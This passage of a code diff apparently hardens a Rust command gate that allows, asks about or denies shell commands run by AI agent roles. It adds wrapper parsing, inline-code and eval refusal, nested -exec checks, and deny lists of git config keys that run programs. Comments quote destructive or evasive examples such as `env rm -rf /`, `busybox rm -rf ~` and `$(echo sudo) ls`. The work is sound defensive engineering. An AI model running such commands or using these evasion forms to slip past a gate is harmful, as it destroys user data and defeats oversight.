@@ -235,7 +235,6 @@ const READ_ONLY: &[&str] = &[
     "true",
     "false",
     "date",
-    "env",
     "uname",
     "hostname",
     "whoami",
@@ -330,9 +329,30 @@ fn writes_output_file(prog: &str, words: &[String]) -> bool {
     }
 }
 
-/// On the read-only list, and not in a form that writes a file.
+/// A read-only command in a form that runs another program: `sort
+/// --compress-program`, `rg --pre`, `fd --exec`. Or edits in place: `yq -i`.
+fn runs_or_edits(prog: &str, words: &[String]) -> bool {
+    let has = |fs: &[&str]| {
+        words.iter().any(|w| {
+            fs.iter().any(|f| {
+                w == f
+                    || w.starts_with(&format!("{f}="))
+                    || (f.len() == 2 && !f.starts_with("--") && w.starts_with(f))
+            })
+        })
+    };
+    match prog {
+        "sort" => has(&["--compress-program"]),
+        "rg" => has(&["--pre"]),
+        "fd" => has(&["-x", "--exec", "-X", "--exec-batch"]),
+        "yq" => has(&["-i", "--inplace"]),
+        _ => false,
+    }
+}
+
+/// On the read-only list, and not in a form that writes a file or runs one.
 fn read_only(prog: &str, words: &[String]) -> bool {
-    READ_ONLY.contains(&prog) && !writes_output_file(prog, words)
+    READ_ONLY.contains(&prog) && !writes_output_file(prog, words) && !runs_or_edits(prog, words)
 }
 
 /// Commands whose file arguments must not be a secret: they print contents.
@@ -341,38 +361,235 @@ const READERS: &[&str] = &[
     "fgrep", "rg", "nl", "tac", "cut", "awk", "sed", "sort", "uniq", "diff", "cmp", "jq", "yq",
 ];
 
-/// Build, test, and lint entry points the auditor may run.
-const AUDIT_OK: &[&str] = &[
-    "cargo",
-    "rustc",
-    "rustfmt",
-    "clippy-driver",
-    "npm",
-    "pnpm",
-    "yarn",
-    "npx",
-    "node",
-    "pytest",
-    "python",
-    "python3",
-    "tox",
-    "ruff",
-    "mypy",
-    "go",
-    "gofmt",
-    "make",
-    "just",
-    "ctest",
-    "cmake",
-    "mvn",
-    "gradle",
-    "dotnet",
-    "swift",
-    "zig",
-    "bun",
-    "deno",
-    "true",
-];
+/// What the review hat and the auditor may run: the forms of build, test,
+/// and lint tools that check the tree without changing it. They used to be
+/// allowed a tool by name, so `cargo fmt`, `npm install`, `npx <anything>`,
+/// and `make install` ran without asking in the review hat, in the user's
+/// own tree. `args` are the words after the program. The auditor, in its
+/// worktree, may also install the dependencies the lockfile names.
+fn checks_only(prog: &str, args: &[String], worktree: bool) -> bool {
+    let has = |f: &str| {
+        args.iter()
+            .any(|a| a == f || a.starts_with(&format!("{f}=")))
+    };
+    let any_of = |fs: &[&str]| fs.iter().any(|f| has(f));
+    let plain: Vec<&str> = args
+        .iter()
+        .map(String::as_str)
+        .filter(|a| !a.starts_with('-') && !a.starts_with('+') && !a.contains('='))
+        .collect();
+    let sub = plain.first().copied();
+    let asks_version = any_of(&["--version", "-V", "--help", "-h"]);
+    match prog {
+        "true" | "pytest" | "py.test" | "tox" | "nox" | "mypy" | "pyright" | "flake8"
+        | "pylint" | "pyflakes" | "ctest" | "clippy-driver" | "vitest" | "jest" | "mocha" => {
+            // Snapshot updates rewrite files.
+            !any_of(&["-u", "--update", "--updateSnapshot", "--snapshot-update"])
+        }
+        "cargo" => match sub {
+            None => asks_version,
+            Some(
+                "test" | "t" | "check" | "c" | "build" | "b" | "bench" | "doc" | "d" | "nextest"
+                | "tree" | "metadata" | "verify-project" | "locate-project" | "pkgid" | "help"
+                | "run" | "r",
+            ) => true,
+            Some("clippy") => !any_of(&["--fix"]),
+            Some("fmt") => has("--check"),
+            Some("fetch") => worktree,
+            _ => false,
+        },
+        "rustc" => asks_version || any_of(&["--explain", "--print", "-vV"]),
+        "rustfmt" => has("--check"),
+        "npm" | "pnpm" | "yarn" | "bun" => {
+            let rest: Vec<&str> = plain.iter().skip(1).copied().collect();
+            match sub {
+                None => asks_version,
+                Some(
+                    "test" | "t" | "tst" | "ls" | "list" | "why" | "outdated" | "view" | "info"
+                    | "explain" | "help",
+                ) => true,
+                Some("audit") => !rest.contains(&"fix") && !has("--fix"),
+                Some("run" | "run-script") => rest
+                    .first()
+                    .is_some_and(|s| script_checks(s) || (prog == "bun" && looks_like_path(s))),
+                Some("exec" | "x" | "dlx") => {
+                    rest.first().is_some_and(|t| tool_checks(t, &args[1..]))
+                }
+                // A clean install from the lockfile, in the auditor's worktree.
+                Some("ci") => worktree,
+                Some("install" | "i") => worktree && rest.is_empty(),
+                // `yarn lint`, `pnpm typecheck`, `bun src/x.test.ts`.
+                Some(s) if prog != "npm" => {
+                    script_checks(s) || (prog == "bun" && looks_like_path(s))
+                }
+                _ => false,
+            }
+        }
+        "npx" | "bunx" | "pnpx" => sub.is_some_and(|t| tool_checks(t, args)),
+        // Runs a file (inline code is refused before this).
+        "node" | "nodejs" | "tsx" | "ts-node" => true,
+        "deno" => match sub {
+            None => asks_version,
+            Some("test" | "check" | "lint" | "run" | "info" | "doc" | "bench") => true,
+            Some("fmt") => has("--check"),
+            Some("task") => plain.get(1).is_some_and(|t| script_checks(t)),
+            Some(s) => looks_like_path(s),
+        },
+        "python" | "python3" => match args.iter().position(|a| a == "-m") {
+            Some(i) => args
+                .get(i + 1)
+                .is_some_and(|m| module_checks(m, &args[i + 2..])),
+            None => true,
+        },
+        "ruff" => match sub {
+            Some("format") => any_of(&["--check", "--diff"]),
+            Some("check") | None => {
+                !any_of(&["--fix", "--fix-only", "--unsafe-fixes"]) || asks_version
+            }
+            Some(_) => !any_of(&["--fix", "--fix-only"]),
+        },
+        "black" | "autopep8" | "yapf" => any_of(&["--check", "--diff"]),
+        "isort" => any_of(&["--check", "--check-only", "-c", "--diff"]),
+        "go" => match sub {
+            None => asks_version,
+            Some(
+                "test" | "vet" | "build" | "list" | "version" | "doc" | "run" | "help" | "tool",
+            ) => true,
+            Some("env") => !any_of(&["-w", "-u"]),
+            Some("mod") => match plain.get(1) {
+                Some(&("verify" | "graph" | "why")) => true,
+                Some(&"download") => worktree,
+                _ => false,
+            },
+            _ => false,
+        },
+        "gofmt" => !has("-w"),
+        "make" | "gmake" | "just" => {
+            if any_of(&["-n", "--dry-run", "--just-print", "--recon"]) || asks_version {
+                return true;
+            }
+            // `make` alone builds; `just` alone runs whatever comes first.
+            if plain.is_empty() {
+                return prog != "just";
+            }
+            plain.iter().all(|t| target_checks(t))
+        }
+        "cmake" => !any_of(&["--install", "-E"]),
+        "mvn" | "mvnw" => {
+            !plain.is_empty()
+                && plain.iter().all(|g| {
+                    matches!(
+                        *g,
+                        "test" | "verify" | "compile" | "test-compile" | "validate" | "package"
+                    )
+                })
+        }
+        "gradle" | "gradlew" => {
+            !plain.is_empty()
+                && plain
+                    .iter()
+                    .all(|t| target_checks(t.rsplit(':').next().unwrap_or(t)))
+        }
+        "dotnet" => match sub {
+            None => asks_version || any_of(&["--info", "--list-sdks", "--list-runtimes"]),
+            Some("test" | "build" | "list") => true,
+            Some("format") => has("--verify-no-changes"),
+            Some("restore") => worktree,
+            _ => false,
+        },
+        "swift" => matches!(sub, Some("test" | "build")) || asks_version,
+        "zig" => match sub {
+            Some("test" | "build" | "version" | "env") => true,
+            Some("fmt") => has("--check"),
+            _ => asks_version,
+        },
+        _ => false,
+    }
+}
+
+/// A package script, task, or make target whose name says it checks.
+fn script_checks(name: &str) -> bool {
+    let n = name.to_ascii_lowercase();
+    [
+        "test",
+        "lint",
+        "check",
+        "typecheck",
+        "type-check",
+        "tsc",
+        "vitest",
+        "jest",
+        "verify",
+    ]
+    .iter()
+    .any(|p| n.starts_with(p))
+        && !["fix", "format", "write", "update", "snapshot"]
+            .iter()
+            .any(|w| n.contains(w))
+}
+
+/// A make, just, or gradle target that checks or builds, and doesn't
+/// install, publish, clean, or reformat.
+fn target_checks(t: &str) -> bool {
+    let n = t.to_ascii_lowercase();
+    (script_checks(&n)
+        || n.starts_with("build")
+        || n == "all"
+        || n == "ci"
+        || n.starts_with("compile"))
+        && ![
+            "install", "deploy", "publish", "release", "clean", "fmt", "fix", "format",
+        ]
+        .iter()
+        .any(|w| n.contains(w))
+}
+
+/// A tool run through `npx`/`bunx`/`npm exec`, in a form that only checks.
+fn tool_checks(tool: &str, args: &[String]) -> bool {
+    let has = |f: &str| {
+        args.iter()
+            .any(|a| a == f || a.starts_with(&format!("{f}=")))
+    };
+    let name = tool.split('@').find(|p| !p.is_empty()).unwrap_or(tool);
+    let name = name.rsplit('/').next().unwrap_or(name);
+    match name {
+        "vitest" | "jest" | "mocha" | "c8" | "nyc" | "ava" | "tap" => {
+            !(has("-u") || has("--update") || has("--updateSnapshot"))
+        }
+        "playwright" => args.iter().any(|a| a == "test"),
+        "eslint" => !args.iter().any(|a| a.starts_with("--fix")),
+        "tsc" => has("--noEmit") || has("--version") || has("-v"),
+        "prettier" => has("--check") || has("-c") || has("--list-different") || has("-l"),
+        "biome" => !(has("--write") || has("--apply") || has("--fix") || has("--apply-unsafe")),
+        _ => false,
+    }
+}
+
+/// `python -m <module>`: modules that only check. Anything else runs as a
+/// project module would, except the ones that install or rewrite.
+fn module_checks(module: &str, rest: &[String]) -> bool {
+    let has = |fs: &[&str]| rest.iter().any(|a| fs.contains(&a.as_str()));
+    match module {
+        "pip" | "pip3" => {
+            matches!(
+                rest.iter()
+                    .find(|a| !a.starts_with('-'))
+                    .map(String::as_str),
+                Some("list" | "show" | "freeze" | "check" | "debug")
+            ) || has(&["--version"])
+        }
+        "black" | "autopep8" | "yapf" => has(&["--check", "--diff"]),
+        "isort" => has(&["--check", "--check-only", "-c", "--diff"]),
+        "ruff" => {
+            !has(&["--fix", "--fix-only", "--unsafe-fixes"])
+                && (rest.first().map(String::as_str) != Some("format")
+                    || has(&["--check", "--diff"]))
+        }
+        "venv" | "virtualenv" | "ensurepip" | "build" | "twine" | "pipx" | "poetry" | "pdm"
+        | "uv" | "pre_commit" | "http.server" | "pyupgrade" | "autoflake" => false,
+        _ => true,
+    }
+}
 
 /// Shells and interpreters. Running one with no script file means the code
 /// arrives on stdin or in `-c`, which puts it past every check in this module
@@ -394,6 +611,12 @@ const INTERPRETERS: &[&str] = &[
     "lua",
     "rscript",
     "osascript",
+    "node",
+    "nodejs",
+    "deno",
+    "bun",
+    "tsx",
+    "ts-node",
 ];
 
 /// Commands that destroy or relocate files, so their path arguments matter.
@@ -499,12 +722,34 @@ fn cd_within(seg: &str, ctx: &ToolContext) -> Option<PathBuf> {
 /// Judge one shell segment (no `;`, `&&`, `|`, or substitution inside).
 fn decide_segment(seg: &str, ctx: &ToolContext) -> Decision {
     let words = words(seg);
-    let Some(prog) = program(&words) else {
+    let parsed = parse(&words);
+    if parsed.hidden {
+        return Decision::Deny;
+    }
+    let Some(prog) = parsed.prog else {
         // An empty segment is punctuation, not a command.
         return Decision::Allow;
     };
+    // A command named by a variable or a substitution is decided by the
+    // shell at run time; the gate can't judge a name it can't read.
+    // `eval` is inline code by another name.
+    if computed(prog) || prog == "eval" {
+        return Decision::Deny;
+    }
     if NEVER.contains(&prog) || prog.starts_with("mkfs") {
         return Decision::Deny;
+    }
+    // `find -exec cmd {} ;` runs `cmd`: it answers to the same rules.
+    let mut nested = Decision::Allow;
+    for inner in exec_commands(prog, &words) {
+        nested = nested.and(decide_segment(&inner, ctx));
+        if nested == Decision::Deny {
+            return Decision::Deny;
+        }
+    }
+    // A builder that leaves its worktree has left what it may change freely.
+    if ctx.role == Role::Builder && matches!(prog, "cd" | "pushd") && cd_escapes(&words, ctx) {
+        return Decision::Ask;
     }
     // The build hat may reach outside the project, but only by asking each
     // time, and never into the places a person wouldn't hand over.
@@ -539,7 +784,7 @@ fn decide_segment(seg: &str, ctx: &ToolContext) -> Decision {
         return Decision::Deny;
     }
     // A shell fed code on stdin or via `-c` hides the real command.
-    if INTERPRETERS.contains(&prog) && !runs_a_script(&words) {
+    if INTERPRETERS.contains(&prog) && inline_code(prog, &words[parsed.args.min(words.len())..]) {
         return Decision::Deny;
     }
     // Destruction is judged the same way for every role; what changes is
@@ -552,14 +797,17 @@ fn decide_segment(seg: &str, ctx: &ToolContext) -> Decision {
         }
         // In the user's own tree, destruction always asks.
         if ctx.role == Role::SoloBuild {
-            return Decision::Ask.and(outside);
+            return Decision::Ask.and(outside).and(nested);
         }
-        if path_escapes(&words, ctx) {
+        // `… | xargs rm -rf`: the paths arrive on stdin, where no check
+        // sees them.
+        if parsed.via_xargs || path_escapes(&words, ctx) {
             return Decision::Ask;
         }
-        return Decision::Allow;
+        return nested;
     }
-    match ctx.role {
+    let args = &words[parsed.args.min(words.len())..];
+    let base = match ctx.role {
         Role::Builder => Decision::Allow,
         // A normal agent in the user's tree: looking runs, doing asks.
         Role::SoloBuild => {
@@ -571,7 +819,7 @@ fn decide_segment(seg: &str, ctx: &ToolContext) -> Decision {
             base.and(outside)
         }
         Role::Auditor | Role::SoloReview => {
-            if AUDIT_OK.contains(&prog) || read_only(prog, &words) {
+            if checks_only(prog, args, ctx.role == Role::Auditor) || read_only(prog, &words) {
                 Decision::Allow
             } else {
                 Decision::Deny
@@ -584,6 +832,60 @@ fn decide_segment(seg: &str, ctx: &ToolContext) -> Decision {
                 Decision::Deny
             }
         }
+    };
+    base.and(nested)
+}
+
+/// A program name the shell computes: `$X`, `${X}`, or a substitution.
+fn computed(prog: &str) -> bool {
+    prog.contains('$') || prog.contains('`')
+}
+
+/// The commands `find -exec`/`-execdir`/`-ok`/`-okdir` would run.
+fn exec_commands(prog: &str, words: &[String]) -> Vec<String> {
+    if prog == "fd" {
+        // `fd PATTERN -x cmd args…`: the rest of the words are the command.
+        return words
+            .iter()
+            .position(|w| matches!(w.as_str(), "-x" | "--exec" | "-X" | "--exec-batch"))
+            .map(|i| vec![words[i + 1..].join(" ")])
+            .unwrap_or_default();
+    }
+    if prog != "find" {
+        return Vec::new();
+    }
+    let mut out = Vec::new();
+    let mut it = words.iter();
+    while let Some(w) = it.next() {
+        if matches!(w.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir") {
+            let cmd: Vec<String> = it
+                .by_ref()
+                .take_while(|a| !matches!(a.as_str(), ";" | "+" | "\\;"))
+                .map(|a| {
+                    // Quoted back, so the words split the same way again.
+                    if a.contains(' ') {
+                        format!("'{a}'")
+                    } else {
+                        a.clone()
+                    }
+                })
+                .collect();
+            out.push(cmd.join(" "));
+        }
+    }
+    out
+}
+
+/// A `cd` or `pushd` that leaves the boundary, goes home, or can't be read.
+fn cd_escapes(words: &[String], ctx: &ToolContext) -> bool {
+    let dirs: Vec<&String> = words
+        .iter()
+        .skip(1)
+        .filter(|w| !w.starts_with('-') || w.as_str() == "-")
+        .collect();
+    match dirs.as_slice() {
+        [dir] => dir.as_str() == "-" || resolve(ctx, dir).is_none(),
+        _ => true,
     }
 }
 
@@ -592,16 +894,79 @@ fn decide_segment(seg: &str, ctx: &ToolContext) -> Decision {
 /// policy", an auditor in a live run gave up and hand-traced instead.
 pub fn bash_hint(args: &Value) -> Option<&'static str> {
     let cmd = args.get("command").and_then(Value::as_str)?;
+    let hidden = segments(cmd).iter().any(|s| {
+        let w = words(s);
+        let p = parse(&w);
+        p.hidden || p.prog.is_some_and(computed) || (p.prog != Some("echo") && s.contains(SUBST))
+    });
+    if hidden {
+        return Some(
+            "A command named by a variable or `$(…)`, or files named by `$(…)`, can't be \
+             checked before it runs, so it is refused. Write the command out, or pipe the \
+             names instead (`git ls-files '*.rs' | xargs wc -l`).",
+        );
+    }
     segments(cmd)
         .iter()
         .map(|s| words(s))
-        .any(|w| program(&w).is_some_and(|p| INTERPRETERS.contains(&p)) && !runs_a_script(&w))
+        .any(|w| {
+            let p = parse(&w);
+            p.prog.is_some_and(|prog| {
+                prog == "eval"
+                    || (INTERPRETERS.contains(&prog)
+                        && inline_code(prog, &w[p.args.min(w.len())..]))
+            })
+        })
         .then_some(
             "Inline code (`-c`, `-e`, heredocs, stdin) is refused because the gate cannot \
              read it; this is about the code, not where it runs. Write the code to a file \
              (`printf '...' > probe.py`, in the project) and run that file \
              (`python3 probe.py`, or `python3 -m unittest tests.test_probe`).",
         )
+}
+
+/// Code handed to an interpreter inline rather than read from disk: `-c`,
+/// `-e`, `--eval`, `--print`, stdin, `deno eval`, or a REPL. `args` are the
+/// words after the interpreter.
+fn inline_code(prog: &str, args: &[String]) -> bool {
+    let flag = |fs: &[&str]| {
+        args.iter()
+            .any(|a| fs.iter().any(|f| a == f || a.starts_with(&format!("{f}="))))
+    };
+    match prog {
+        // `node --test` runs the test files on disk; `-p`/`--print` evaluate
+        // their argument like `-e`.
+        "node" | "nodejs" | "tsx" | "ts-node" => {
+            flag(&["-e", "--eval", "-p", "--print", "-i", "--interactive", "-"])
+                || !args.iter().any(|a| {
+                    a == "--test"
+                        || matches!(a.as_str(), "--version" | "-v" | "--help" | "-h")
+                        || (!a.starts_with('-') && looks_like_path(a))
+                })
+        }
+        "deno" => {
+            let sub = args
+                .iter()
+                .find(|a| !a.starts_with('-'))
+                .map(String::as_str);
+            matches!(sub, None | Some("eval" | "repl"))
+                && !flag(&["--version", "-V", "--help", "-h"])
+        }
+        "bun" => {
+            let sub = args
+                .iter()
+                .find(|a| !a.starts_with('-'))
+                .map(String::as_str);
+            flag(&["-e", "--eval", "-p", "--print"])
+                || (matches!(sub, None | Some("repl"))
+                    && !flag(&["--version", "-v", "--help", "-h"]))
+        }
+        _ => {
+            let mut all = vec![String::from(prog)];
+            all.extend_from_slice(args);
+            !runs_a_script(&all)
+        }
+    }
 }
 
 /// True when an interpreter runs code that is on disk (a script, or a module
@@ -628,16 +993,117 @@ fn runs_a_script(words: &[String]) -> bool {
     !saw_inline && on_disk
 }
 
+/// `git -c` keys whose value is a program git runs, or a shell command
+/// (`alias.x = !cmd`). Setting one on the command line runs anything under
+/// the name of a harmless git verb.
+fn git_config_runs(key: &str, value: &str) -> bool {
+    let key = key.to_ascii_lowercase();
+    const RUNS: &[&str] = &[
+        "core.sshcommand",
+        "core.pager",
+        "core.editor",
+        "core.fsmonitor",
+        "core.hookspath",
+        "core.gitproxy",
+        "core.askpass",
+        "sequence.editor",
+        "diff.external",
+        "gpg.program",
+        "gpg.ssh.program",
+        "credential.helper",
+        "uploadpack.packobjectshook",
+        "protocol.allow",
+        "protocol.ext.allow",
+        "http.proxy",
+        "remote.",
+        "url.",
+        "include.path",
+        "includeif.",
+    ];
+    RUNS.iter().any(|k| key.starts_with(k))
+        || key.starts_with("pager.")
+        || key.starts_with("filter.")
+        || key.starts_with("credential.")
+        || key.ends_with(".textconv")
+        || key.ends_with(".command")
+        || key.ends_with(".driver")
+        || key.ends_with(".cmd")
+        || key.ends_with(".tool")
+        || (key.starts_with("alias.") && value.trim_start().starts_with('!'))
+}
+
 /// `git` is one binary with many verbs; the verb decides.
 fn decide_git(words: &[String], ctx: &ToolContext) -> Decision {
-    let sub = words
-        .iter()
-        .skip(1)
-        .find(|w| !w.starts_with('-'))
-        .map(String::as_str)
-        .unwrap_or("");
+    // Global options before the verb. `-c` sets configuration, some of
+    // which names a program; `-C`, `--git-dir`, and `--work-tree` move git
+    // to another repository.
+    let mut i = 1;
+    let mut elsewhere = false;
+    while let Some(w) = words.get(i).map(String::as_str) {
+        if !w.starts_with('-') {
+            break;
+        }
+        let (flag, attached) = match w.split_once('=') {
+            Some((f, v)) if w.starts_with("--") => (f, Some(v.to_string())),
+            _ => (w, None),
+        };
+        let value = |i: &mut usize| {
+            attached.clone().or_else(|| {
+                *i += 1;
+                words.get(*i).cloned()
+            })
+        };
+        match flag {
+            "--exec-path" if attached.is_some() => return Decision::Deny,
+            "-c" | "--config-env" => {
+                let kv = value(&mut i).unwrap_or_default();
+                let (k, v) = kv.split_once('=').unwrap_or((&kv, ""));
+                if git_config_runs(k, v) {
+                    return Decision::Deny;
+                }
+            }
+            "-C" | "--git-dir" | "--work-tree" => {
+                let dir = value(&mut i).unwrap_or_default();
+                if resolve(ctx, &dir).is_none() {
+                    elsewhere = true;
+                }
+            }
+            "--namespace" | "--super-prefix" | "--list-cmds" | "--attr-source" => {
+                let _ = value(&mut i);
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+    let sub = words.get(i).map(String::as_str).unwrap_or("");
     if GIT_NEVER.contains(&sub) {
         return Decision::Deny;
+    }
+    let rest = &words[i.min(words.len())..];
+    // `git grep -O<pager>` runs a program on the matches.
+    if rest
+        .iter()
+        .any(|w| w.starts_with("-O") || w.starts_with("--open-files-in-pager"))
+    {
+        return Decision::Deny;
+    }
+    // `git diff --output=f` writes a file from a reading verb.
+    // Git's reading verbs skip the path checks, so the file could be
+    // anywhere: the roles that may write are asked.
+    if rest.iter().any(|w| w.starts_with("--output")) {
+        return if ctx.role.writes_source() {
+            Decision::Ask
+        } else {
+            Decision::Deny
+        };
+    }
+    // Another repository: outside what any role was handed. The build hat
+    // asks, as it does for any path outside.
+    if elsewhere {
+        return match ctx.role {
+            Role::SoloBuild | Role::Builder => Decision::Ask,
+            _ => Decision::Deny,
+        };
     }
     // Ref deletion reaches the user's branches from inside a worktree.
     let deletes_ref = matches!(sub, "branch" | "tag" | "worktree")
@@ -740,18 +1206,30 @@ fn deleting_find(prog: &str, words: &[String]) -> bool {
         })
 }
 
+/// Where a command substitution stood in the command around it. It contains
+/// `$`, so a path check treats it as unknowable, and a program check refuses
+/// it: the shell decides that word at run time, not the gate.
+pub(crate) const SUBST: &str = "$(…)";
+
 /// Split `cmd` the way a shell would, so each command is judged on its own.
 ///
 /// Single quotes protect everything; double quotes still allow command
 /// substitution, so `$(` and a backtick split inside them. Over-splitting only
 /// adds scrutiny, so ambiguous punctuation becomes a boundary.
+///
+/// A substitution is its own segment, listed before the command it sits in
+/// (it runs first), and the command keeps [`SUBST`] in its place. Splitting
+/// the command around it instead turned `$(echo sudo) ls` into a harmless
+/// `echo sudo` and `ls`.
 fn segments(cmd: &str) -> Vec<String> {
     let mut out = Vec::new();
     let mut cur = String::new();
     let mut single = false;
     let mut double = false;
-    // Depth of `$( … )`. Inside it the enclosing double quotes do not apply.
-    let mut subst = 0usize;
+    // Commands a substitution interrupted, innermost last, with the quoting
+    // they were in. `$(` pushes; `)` pops. A backtick toggles.
+    let mut outer: Vec<(String, bool)> = Vec::new();
+    let mut backtick: Option<usize> = None;
     let mut chars = cmd.chars().peekable();
     let push = |cur: &mut String, out: &mut Vec<String>| {
         let t = cur.trim();
@@ -762,6 +1240,12 @@ fn segments(cmd: &str) -> Vec<String> {
     };
     while let Some(c) = chars.next() {
         match c {
+            '\\' if !single => {
+                cur.push(c);
+                if let Some(n) = chars.next() {
+                    cur.push(n);
+                }
+            }
             '\'' if !double => {
                 single = !single;
                 cur.push(c);
@@ -772,17 +1256,32 @@ fn segments(cmd: &str) -> Vec<String> {
             }
             _ if single => cur.push(c),
             // Command substitution runs even inside double quotes.
-            '`' => push(&mut cur, &mut out),
+            '`' if backtick == Some(outer.len()) => {
+                push(&mut cur, &mut out);
+                let (parent, quoted) = outer.pop().unwrap_or_default();
+                cur = parent;
+                double = quoted;
+                cur.push_str(SUBST);
+                backtick = None;
+            }
+            '`' => {
+                outer.push((std::mem::take(&mut cur), double));
+                double = false;
+                backtick = Some(outer.len());
+            }
             '$' if chars.peek() == Some(&'(') => {
                 chars.next();
-                push(&mut cur, &mut out);
-                subst += 1;
+                outer.push((std::mem::take(&mut cur), double));
+                double = false;
             }
-            ')' if subst > 0 => {
-                subst -= 1;
+            ')' if !outer.is_empty() && backtick != Some(outer.len()) && !double => {
                 push(&mut cur, &mut out);
+                let (parent, quoted) = outer.pop().unwrap_or_default();
+                cur = parent;
+                double = quoted;
+                cur.push_str(SUBST);
             }
-            _ if double && subst == 0 => cur.push(c),
+            _ if double => cur.push(c),
             // `2>&1`, `>&2`, `&>file`: an `&` touching a `>` is part of a
             // redirect, not a background or `&&` separator.
             '&' if cur.ends_with('>') || chars.peek() == Some(&'>') => cur.push(c),
@@ -790,7 +1289,12 @@ fn segments(cmd: &str) -> Vec<String> {
             _ => cur.push(c),
         }
     }
+    // Unclosed substitutions: judge what was written, all of it.
     push(&mut cur, &mut out);
+    while let Some((parent, _)) = outer.pop() {
+        let mut parent = parent;
+        push(&mut parent, &mut out);
+    }
     out
 }
 
@@ -801,8 +1305,22 @@ fn words(seg: &str) -> Vec<String> {
     let mut single = false;
     let mut double = false;
     let mut any = false;
-    for c in seg.chars() {
+    let mut chars = seg.chars();
+    while let Some(c) = chars.next() {
         match c {
+            // `s\udo` is `sudo` to the shell. Inside double quotes a
+            // backslash only escapes `$`, a backtick, `"`, or itself.
+            '\\' if !single => {
+                match chars.next() {
+                    Some(n) if !double || matches!(n, '$' | '`' | '"' | '\\') => cur.push(n),
+                    Some(n) => {
+                        cur.push('\\');
+                        cur.push(n);
+                    }
+                    None => cur.push('\\'),
+                }
+                any = true;
+            }
             '\'' if !double => {
                 single = !single;
                 any = true;
@@ -830,39 +1348,207 @@ fn words(seg: &str) -> Vec<String> {
     out
 }
 
-/// The program a segment runs, skipping `VAR=value` prefixes and wrappers that
-/// would otherwise hide the real command (`env rm -rf /`, `time sudo …`).
-fn program(words: &[String]) -> Option<&str> {
+/// Programs that run another program named in their arguments: the
+/// options that take a value, and how many plain arguments come before the
+/// command (`timeout 5 cmd`, `taskset 0x1 cmd`, `flock file cmd`).
+///
+/// Taking the first word after a wrapper as the program let `env -i sudo`,
+/// `timeout 5 sudo`, and `nice dd` past the never-run list: the program was
+/// read as `-i`, `5`, and `dd`'s absence.
+const WRAPPERS: &[(&str, &[&str], usize)] = &[
+    ("command", &[], 0),
+    ("builtin", &[], 0),
+    ("exec", &["-a"], 0),
+    ("time", &["-f", "--format", "-o", "--output"], 0),
+    ("env", &["-u", "--unset", "-C", "--chdir"], 0),
+    (
+        "xargs",
+        &[
+            "-a",
+            "--arg-file",
+            "-d",
+            "--delimiter",
+            "-E",
+            "-I",
+            "-L",
+            "--max-lines",
+            "-n",
+            "--max-args",
+            "-P",
+            "--max-procs",
+            "-s",
+            "--max-chars",
+            "--process-slot-var",
+        ],
+        0,
+    ),
+    ("nice", &["-n", "--adjustment"], 0),
+    (
+        "ionice",
+        &[
+            "-c",
+            "--class",
+            "-n",
+            "--classdata",
+            "-p",
+            "--pid",
+            "-P",
+            "--pgid",
+            "-u",
+            "--uid",
+        ],
+        0,
+    ),
+    ("timeout", &["-s", "--signal", "-k", "--kill-after"], 1),
+    (
+        "stdbuf",
+        &["-i", "--input", "-o", "--output", "-e", "--error"],
+        0,
+    ),
+    ("taskset", &[], 1),
+    (
+        "flock",
+        &["-w", "--timeout", "-E", "--conflict-exit-code"],
+        1,
+    ),
+    ("chrt", &[], 1),
+    ("unbuffer", &[], 0),
+    ("caffeinate", &["-t", "-w"], 0),
+    (
+        "watch",
+        &["-n", "--interval", "-d", "--differences", "-q", "--equexit"],
+        0,
+    ),
+    (
+        "strace",
+        &[
+            "-o", "-e", "-p", "-s", "-E", "-u", "-a", "-b", "-I", "-O", "-P", "-S", "-X",
+        ],
+        0,
+    ),
+    ("ltrace", &["-o", "-e", "-p", "-s", "-u", "-a", "-n"], 0),
+    // Multi-call binaries: `busybox rm -rf ~` is `rm`.
+    ("busybox", &[], 0),
+    ("toybox", &[], 0),
+];
+
+/// What a segment runs, seen through assignments and wrappers.
+#[derive(Debug, Default, PartialEq, Eq)]
+struct Parsed<'a> {
+    /// The program, by its base name.
+    prog: Option<&'a str>,
+    /// Where its arguments start.
+    args: usize,
+    /// Its arguments come from stdin (`xargs`), so no check can see them.
+    via_xargs: bool,
+    /// The real command can't be read from the words: a wrapper that takes
+    /// it as one string (`env -S`, `flock -c`, `watch` with one argument).
+    hidden: bool,
+}
+
+fn parse(words: &[String]) -> Parsed<'_> {
+    let mut p = Parsed::default();
     let mut i = 0;
-    loop {
-        let w = words.get(i)?.as_str();
+    'outer: loop {
+        let Some(w) = words.get(i).map(String::as_str) else {
+            return p;
+        };
         // `FOO=bar cmd` — an assignment, not the command.
         if let Some(eq) = w.find('=') {
-            if eq > 0 && !w[..eq].contains('/') {
+            if eq > 0 && !w[..eq].contains('/') && !w.starts_with('-') {
                 i += 1;
                 continue;
             }
         }
         let base = w.rsplit('/').next().unwrap_or(w);
-        // Wrappers that take the real command as their argument. `env` and
-        // `xargs` are transparent; `sudo` is not (it stays visible to `NEVER`).
-        if matches!(
-            base,
-            "command" | "time" | "builtin" | "exec" | "xargs" | "env"
-        ) && words.len() > i + 1
-        {
-            i += 1;
-            continue;
+        let Some((_, takes_value, positional)) = WRAPPERS.iter().find(|(name, _, _)| *name == base)
+        else {
+            p.prog = Some(base);
+            p.args = i + 1;
+            return p;
+        };
+        // `command -v cargo` only looks a name up.
+        if base == "command" && words[i + 1..].iter().any(|a| a == "-v" || a == "-V") {
+            p.prog = Some("type");
+            p.args = i + 1;
+            return p;
         }
-        return Some(base);
+        let start = i;
+        i += 1;
+        let mut left = *positional;
+        while let Some(a) = words.get(i).map(String::as_str) {
+            if a == "--" {
+                i += 1;
+                break;
+            }
+            let short = a.len() > 1 && a.starts_with('-') && !a.starts_with("--");
+            if base == "env"
+                && (a == "-S" || a.starts_with("--split-string") || (short && a[1..].contains('S')))
+            {
+                p.hidden = true;
+                return p;
+            }
+            if base == "flock" && (a == "-c" || a == "--command") {
+                p.hidden = true;
+                return p;
+            }
+            if a.starts_with("--") {
+                i += if a.contains('=') || !takes_value.contains(&a) {
+                    1
+                } else {
+                    2
+                };
+                continue;
+            }
+            if short {
+                // `-n 5`, or `-n5` / `-oL` with the value attached.
+                i += if takes_value.contains(&a) { 2 } else { 1 };
+                continue;
+            }
+            if base == "env" && a.contains('=') {
+                i += 1;
+                continue;
+            }
+            if left > 0 {
+                left -= 1;
+                i += 1;
+                continue;
+            }
+            break;
+        }
+        if base == "xargs" {
+            p.via_xargs = true;
+        }
+        // `watch 'cmd args'` hands the command to `sh -c` as one string.
